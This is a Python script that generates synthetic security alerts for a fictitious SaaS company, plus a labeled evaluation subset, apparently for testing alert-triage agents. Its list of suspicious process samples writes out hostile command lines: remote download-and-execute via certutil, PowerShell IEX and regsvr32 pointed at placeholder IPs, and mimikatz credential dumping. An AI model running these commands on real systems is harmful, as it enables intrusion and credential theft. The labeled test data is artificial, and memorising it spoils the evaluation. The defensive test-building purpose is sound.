"""
Generates synthetic SIEM-style alerts for Meridian Cloud (fictitious B2B SaaS company).

Outputs:
  data/raw_alerts.json  - full alert set, no ground-truth labels (what the agents see)
  data/eval_set.json    - stratified labeled subset, for the eval harness only

All "external" IPs are drawn from RFC 5737 documentation ranges
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) so nothing here is a real
routable address. Internal IPs use RFC 1918 space (10.42.0.0/16).

Run: python ingestion/generate_synthetic_alerts.py
"""

import json
import random
from datetime import datetime, timedelta
from pathlib import Path

SEED = 42
random.seed(SEED)

# Get the full path to the data directory relative to this script
DATA_DIR = Path(__file__).resolve().parent.parent / "data"
# 9am August 6, 2026 — arbitrary "now" for timestamp generation
NOW = datetime(2026, 8, 6, 9, 0, 0)
# Showing alerts for the past 14 days 
LOOKBACK_DAYS = 14

# ---------------------------------------------------------------------------
# Company fixtures: Meridian Cloud
# ---------------------------------------------------------------------------

EMPLOYEES = [
    ("Ava Thompson", "engineering"), ("Noah Patel", "engineering"),
    ("Liam Chen", "engineering"), ("Sofia Alvarez", "engineering"),
    ("Ethan Kowalski", "engineering"), ("Mia Nguyen", "engineering"),
    ("Lucas Romano", "engineering"), ("Grace Osei", "engineering"),
    ("Jack Whitfield", "it"), ("Priya Ramanathan", "it"),
    ("Marcus Webb", "it"), ("Elena Vasquez", "it"),
    ("Daniel Kim", "finance"), ("Rachel Sorenson", "finance"),
    ("Tomas Novak", "finance"), ("Chloe Bennett", "sales"),
    ("Owen Fitzgerald", "sales"), ("Isla MacDonald", "sales"),
    ("Ben Okafor", "sales"), ("Zara Hussain", "sales"),
    ("Sam Delacroix", "support"), ("Nadia Petrova", "support"),
    ("Theo Andersson", "support"), ("Ruby Fontaine", "support"),
    ("Harper Lindqvist", "hr"), ("Ines Dubois", "hr"),
    ("Victoria Hale", "exec"), ("George Alaoui", "exec"),
]


def make_username(full_name: str) -> str:
    # Split the full name with a maximum of 1 split
    first, last = full_name.split(" ", 1)
    # Create a username by concatenating the first letter of the first name and last name, converting to lowercase, 
    # and removing spaces and apostrophes
    return (first[0] + last).lower().replace(" ", "").replace("'", "")

# Make a list of dictionaries with username, full name, and department for each employee
EMPLOYEE_RECORDS = [
    {"username": make_username(name), "full_name": name, "department": dept}
    for name, dept in EMPLOYEES
]
# Loop through the usernames, then through the departments to select only the IT department usernames
USERNAMES = [e["username"] for e in EMPLOYEE_RECORDS]
IT_ADMINS = [e["username"] for e in EMPLOYEE_RECORDS if e["department"] == "it"]

SERVERS = [
    ("web-01", "web"), ("web-02", "web"),
    ("app-01", "app"), ("app-02", "app"), ("app-03", "app"),
    ("db-01", "database"), ("db-02", "database"),
    ("ci-01", "build"), ("vpn-gw-01", "network"),
    ("fileserver-01", "storage"), ("dc-01", "domain_controller"),
    ("backup-01", "backup"),
]

# --- host -> internal IP map ------------------------------------------------
# Create employee workspace hostnames (WKS-<USERNAME>) and server hostnames
HOSTS = [f"WKS-{u.upper()}" for u in USERNAMES] + [name for name, _ in SERVERS]

# Create a mapping of hostnames to internal IP addresses
HOST_IP = {}
_wks_subnet = list(range(10, 250))
# Shuffle the workstation subnet list to randomize the assignment of IP addresses to workstations
random.shuffle(_wks_subnet)
# Get the index and host for each username and convert it to a workstation identifier
for i, h in enumerate([f"WKS-{u.upper()}" for u in USERNAMES]):
    HOST_IP[h] = f"10.42.10.{_wks_subnet[i]}"
# Create a mapping of server roles to subnets for internal IP addresses
_server_subnets = {"web": 20, "app": 21, "database": 22, "build": 23,
                    "network": 24, "storage": 25, "domain_controller": 26, "backup": 27}
for name, role in SERVERS:
    idx = int(name.split("-")[-1]) if name.split("-")[-1].isdigit() else 1
    HOST_IP[name] = f"10.42.{_server_subnets[role]}.{idx}"

SERVER_NAMES = [name for name, _ in SERVERS]

# --- external IP pools (RFC 5737 documentation ranges only) ----------------

# Fictitious external IPs for safe vendor endpoints
DOC_RANGES = ["192.0.2", "198.51.100", "203.0.113"]

BENIGN_VENDORS = {
    "backup-vendor (CloudVault)": "203.0.113.10",
    "saas-crm (SalesHub)": "198.51.100.20",
    "corp-vpn-egress": "192.0.2.15",
    "package-mirror (pypi-mirror.internal-proxy)": "198.51.100.25",
    "video-conferencing (MeetSpace)": "192.0.2.40",
}


def random_doc_ip():
    return f"{random.choice(DOC_RANGES)}.{random.randint(2, 254)}"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

# Generate a random timestamps assigning weights to where suspicious activity is more likely to occur during off-hours 
# or business hours based on the alert type.
def rand_timestamp(business_hours=True):
    day_offset = random.uniform(0, LOOKBACK_DAYS)
    t = NOW - timedelta(days=day_offset)
    if business_hours:
        hour = random.choices(
            range(24),
            weights=[1, 1, 1, 1, 1, 1, 2, 4, 8, 9, 9, 8, 7, 8, 9, 9, 8, 6, 3, 2, 1, 1, 1, 1],
        )[0]
    else:
        # off-hours bias: nights and weekends more likely
        hour = random.choices(
            range(24),
            weights=[6, 7, 8, 8, 7, 5, 3, 2, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 3, 4, 5, 6, 6, 6],
        )[0]
    return t.replace(hour=hour, minute=random.randint(0, 59), second=random.randint(0, 59)).isoformat()

# Convert a label into a severity level, with some randomness for false positives and needs investigation cases. 
# True positives retain their base severity.
def severity_for(label, base):
    """base: rough severity if this were a true positive, per alert type."""
    if label == "false_positive":
        return random.choice(["low", "low", "medium"])
    if label == "needs_investigation":
        return random.choice(["medium", "medium", "high"])
    return base  # true_positive


ALERT_COUNTER = 0


def next_id():
    global ALERT_COUNTER
    ALERT_COUNTER += 1
    # Format the alert ID as "ALERT-XXXXX" where XXXXX is a zero-padded number
    return f"ALERT-{ALERT_COUNTER:05d}"


# ---------------------------------------------------------------------------
# Alert generators — each returns (alert_dict, label, rationale)
# label/rationale are stripped before writing raw_alerts.json
# ---------------------------------------------------------------------------

def gen_login_alert():
    user = random.choice(USERNAMES)
    host = f"WKS-{user.upper()}"
    roll = random.random()

    if roll < 0.35:
        # benign: normal failed login then success (typo'd password), or IT-driven password reset
        label = "false_positive"
        n_fail = random.randint(1, 3)
        desc = (f"{n_fail} failed login attempt(s) for {user} on {host} followed by a "
                 f"successful login within 2 minutes; consistent with password typo.")
        source_ip = HOST_IP[host]
        severity_base = "low"

    elif roll < 0.65:
        # needs_investigation: single anomaly, e.g. new geolocation via VPN, or off-hours login with no other signal
        label = "needs_investigation"
        desc = (f"Login for {user} observed from a source IP not previously seen for this "
                 f"account in the last 30 days, at an off-hours timestamp. No other anomalies "
                 f"correlated yet.")
        source_ip = random_doc_ip()
        severity_base = "medium"

    elif roll < 0.85:
        # true_positive: impossible travel / credential compromise pattern
        label = "true_positive"
        desc = (f"Successful login for {user} from {random.choice(['an unrecognized ASN', 'a Tor exit node range', 'a known credential-stuffing source range'])} "
                 f"occurred 6 minutes after a successful login from {host}'s usual corporate network IP "
                 f"— physically implausible travel time.")
        source_ip = random_doc_ip()
        severity_base = random.choice(["high", "critical"])

    else:
        # true_positive: brute force success
        label = "true_positive"
        n_fail = random.randint(15, 60)
        desc = (f"{n_fail} failed login attempts for {user} within a 10-minute window from "
                 f"external IP, followed by a successful authentication.")
        source_ip = random_doc_ip()
        severity_base = "critical"

    alert = {
        "timestamp": rand_timestamp(business_hours=(label == "false_positive")),
        "host": host,
        "user": user,
        "source_ip": source_ip,
        "dest_ip": None,
        "process": None,
        "command_line": None,
        "alert_type": "anomalous_login",
        "raw_description": desc,
    }
    return alert, label, severity_for(label, severity_base)


BENIGN_PROCESS_SAMPLES = [
    ("powershell.exe", "powershell.exe -File C:\\Scripts\\Deploy-Patch.ps1 -Silent"),
    ("certutil.exe", "certutil.exe -hashfile C:\\Installers\\vpnclient.msi SHA256"),
    ("robocopy.exe", "robocopy.exe C:\\Projects\\build D:\\Backups\\build /MIR"),
    ("git.exe", "git.exe pull origin main"),
    ("docker.exe", "docker.exe build -t meridian/app:latest ."),
    ("msiexec.exe", "msiexec.exe /i C:\\Installers\\zoom_client.msi /quiet"),
    ("bash", "bash /opt/scripts/nightly_report.sh"),
    ("systemctl", "systemctl restart nginx"),
]

SUSPICIOUS_PROCESS_SAMPLES = [
    ("powershell.exe", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..."),
    ("certutil.exe", "certutil.exe -urlcache -split -f http://{ip}/payload.exe C:\\Users\\Public\\payload.exe"),
    ("rundll32.exe", "rundll32.exe C:\\Users\\Public\\update.dll,Start"),
    ("mimikatz.exe", "mimikatz.exe \"sekurlsa::logonpasswords\" exit"),
    ("wscript.exe", "wscript.exe //B C:\\Users\\Public\\invoice_details.vbs"),
    ("cmd.exe", "cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://{ip}/stage2.ps1') | powershell -"),
    ("regsvr32.exe", "regsvr32.exe /s /u /i:http://{ip}/payload.sct scrobj.dll"),
]

AMBIGUOUS_PROCESS_SAMPLES = [
    ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\audit_check.ps1"),
    ("schtasks.exe", "schtasks.exe /create /tn \"UpdaterTask\" /tr C:\\Windows\\Temp\\updater.exe /sc onlogon"),
    ("curl.exe", "curl.exe -o report.zip http://{ip}/exports/report.zip"),
]


def gen_process_alert():
    host = random.choice(HOSTS)
    user = None
    for u in USERNAMES:
        if HOST_IP.get(f"WKS-{u.upper()}") and host == f"WKS-{u.upper()}":
            user = u
            break
    if user is None and host in SERVER_NAMES:
        user = random.choice(IT_ADMINS + ["svc_ci", "svc_backup"])

    roll = random.random()
    if roll < 0.40:
        label = "false_positive"
        proc, cmd = random.choice(BENIGN_PROCESS_SAMPLES)
        desc = f"Process execution matched a monitored-binary rule ({proc}); command line consistent with routine IT/engineering activity."
        severity_base = "low"
    elif roll < 0.70:
        label = "true_positive"
        proc, cmd_template = random.choice(SUSPICIOUS_PROCESS_SAMPLES)
        cmd = cmd_template.format(ip=random_doc_ip())
        desc = f"Living-off-the-land binary ({proc}) executed with obfuscated or download-and-execute command-line pattern."
        severity_base = random.choice(["high", "critical"])
    else:
        label = "needs_investigation"
        proc, cmd_template = random.choice(AMBIGUOUS_PROCESS_SAMPLES)
        cmd = cmd_template.format(ip=random_doc_ip())
        desc = f"Process execution ({proc}) with a command line that deviates from this host's baseline; business justification not yet confirmed."
        severity_base = "medium"

    alert = {
        "timestamp": rand_timestamp(business_hours=(label == "false_positive")),
        "host": host,
        "user": user,
        "source_ip": HOST_IP.get(host, random_doc_ip()),
        "dest_ip": None,
        "process": proc,
        "command_line": cmd,
        "alert_type": "suspicious_process",
        "raw_description": desc,
    }
    return alert, label, severity_for(label, severity_base)


def gen_network_alert():
    host = random.choice(HOSTS)
    roll = random.random()

    if roll < 0.40:
        label = "false_positive"
        vendor, ip = random.choice(list(BENIGN_VENDORS.items()))
        desc = f"Outbound connection to known vendor endpoint ({vendor}); volume and destination consistent with scheduled job history."
        dest_ip = ip
        severity_base = "low"
    elif roll < 0.70:
        label = "true_positive"
        dest_ip = random_doc_ip()
        pattern = random.choice([
            "Periodic beaconing (near-identical byte size, ~60s interval) to an external IP with no prior history for this host.",
            "Large outbound data transfer (>2GB) to an external IP over a non-standard port, occurring outside business hours.",
            "DNS queries showing high-entropy subdomains consistent with DNS tunneling to an external resolver.",
        ])
        desc = pattern
        severity_base = random.choice(["high", "critical"])
    else:
        label = "needs_investigation"
        dest_ip = random_doc_ip()
        desc = "Outbound connection to an external IP with no reputation data and no prior baseline for this host; volume is modest."
        severity_base = "medium"

    alert = {
        "timestamp": rand_timestamp(business_hours=(label == "false_positive")),
        "host": host,
        "user": None,
        "source_ip": HOST_IP.get(host, random_doc_ip()),
        "dest_ip": dest_ip,
        "process": None,
        "command_line": None,
        "alert_type": "unusual_outbound_network",
        "raw_description": desc,
    }
    return alert, label, severity_for(label, severity_base)


def gen_privesc_alert():
    user = random.choice(USERNAMES)
    host = f"WKS-{user.upper()}" if random.random() < 0.5 else random.choice(SERVER_NAMES)
    roll = random.random()

    if roll < 0.35:
        label = "false_positive"
        desc = (f"{user} added to a privileged local group as part of a documented IT ticket "
                 f"(change request logged); performed by {random.choice(IT_ADMINS)}.")
        severity_base = "low"
    elif roll < 0.65:
        label = "true_positive"
        desc = random.choice([
            f"{user} added to the Domain Admins group with no corresponding change ticket, "
             f"3 minutes after a suspicious PowerShell execution on the same host.",
            f"UAC bypass technique detected: token manipulation observed immediately followed by "
             f"process spawned with SYSTEM privileges on {host}.",
            f"sudoers file modified to grant NOPASSWD to a non-admin account ({user}) outside of "
             f"configuration-management runs.",
        ])
        severity_base = "critical"
    else:
        label = "needs_investigation"
        desc = (f"Local admin group membership changed for {user}; no matching change ticket found "
                 f"yet, but IT change tickets are sometimes logged with a delay.")
        severity_base = "medium"

    alert = {
        "timestamp": rand_timestamp(business_hours=(label == "false_positive")),
        "host": host,
        "user": user,
        "source_ip": HOST_IP.get(host, random_doc_ip()),
        "dest_ip": None,
        "process": None,
        "command_line": None,
        "alert_type": "privilege_escalation",
        "raw_description": desc,
    }
    return alert, label, severity_for(label, severity_base)


def gen_lateral_alert():
    user = random.choice(USERNAMES + IT_ADMINS)
    src_host = random.choice(SERVER_NAMES + [f"WKS-{u.upper()}" for u in USERNAMES])
    dst_host = random.choice([h for h in SERVER_NAMES if h != src_host])
    roll = random.random()

    if roll < 0.30:
        label = "false_positive"
        desc = (f"{random.choice(IT_ADMINS)} used PsExec/WinRM to {dst_host} to deploy a scheduled "
                 f"patch across the server fleet; matches this month's patch-Tuesday change window.")
        severity_base = "low"
    elif roll < 0.65:
        label = "true_positive"
        n_hosts = random.randint(3, 8)
        desc = (f"Account {user} authenticated to {n_hosts} distinct hosts (including {dst_host}) "
                 f"within a 15-minute window using PsExec/WMI, none of which are in this account's "
                 f"normal access pattern; immediately preceded by a credential-dumping alert on {src_host}.")
        severity_base = "critical"
    else:
        label = "needs_investigation"
        desc = (f"RDP session from {src_host} to {dst_host} by {user} outside of this pairing's "
                 f"typical access history; single hop, no other correlated signals yet.")
        severity_base = "high"

    alert = {
        "timestamp": rand_timestamp(business_hours=(label == "false_positive")),
        "host": src_host,
        "user": user,
        "source_ip": HOST_IP.get(src_host, random_doc_ip()),
        "dest_ip": HOST_IP.get(dst_host, random_doc_ip()),
        "process": random.choice(["psexec.exe", "wmic.exe", "mstsc.exe", "winrm"]),
        "command_line": None,
        "alert_type": "lateral_movement",
        "raw_description": desc,
    }
    return alert, label, severity_for(label, severity_base)


GENERATORS = {
    "anomalous_login": gen_login_alert,
    "suspicious_process": gen_process_alert,
    "unusual_outbound_network": gen_network_alert,
    "privilege_escalation": gen_privesc_alert,
    "lateral_movement": gen_lateral_alert,
}

PER_TYPE_COUNT = 52  # 5 types * 52 = 260 alerts


def build_alerts():
    records = []  # (alert, label, severity)
    for alert_type, gen_fn in GENERATORS.items():
        for _ in range(PER_TYPE_COUNT):
            alert, label, severity = gen_fn()
            alert["alert_id"] = next_id()
            records.append((alert, label, severity))
    random.shuffle(records)
    return records


def stratified_eval_sample(records, per_bucket=3):
    """Pick up to `per_bucket` alerts for each (alert_type, label) combination."""
    buckets = {}
    for alert, label, severity in records:
        key = (alert["alert_type"], label)
        buckets.setdefault(key, []).append((alert, label, severity))

    sample = []
    for key, items in buckets.items():
        random.shuffle(items)
        sample.extend(items[:per_bucket])
    return sample


def main():
    records = build_alerts()

    raw_alerts = [alert for alert, _, _ in records]
    raw_alerts.sort(key=lambda a: a["timestamp"])

    eval_records = stratified_eval_sample(records, per_bucket=3)
    eval_set = [
        {
            "alert_id": alert["alert_id"],
            "ground_truth_label": label,
            "expected_severity": severity,
            "alert_type": alert["alert_type"],
        }
        for alert, label, severity in eval_records
    ]
    eval_set.sort(key=lambda e: e["alert_id"])

    DATA_DIR.mkdir(parents=True, exist_ok=True)
    (DATA_DIR / "raw_alerts.json").write_text(json.dumps(raw_alerts, indent=2))
    (DATA_DIR / "eval_set.json").write_text(json.dumps(eval_set, indent=2))

    label_counts = {}
    for _, label, _ in records:
        label_counts[label] = label_counts.get(label, 0) + 1

    print(f"Wrote {len(raw_alerts)} alerts to {DATA_DIR / 'raw_alerts.json'}")
    print(f"Wrote {len(eval_set)} labeled eval records to {DATA_DIR / 'eval_set.json'}")
    print(f"Label distribution (full set): {label_counts}")


if __name__ == "__main__":
    main()
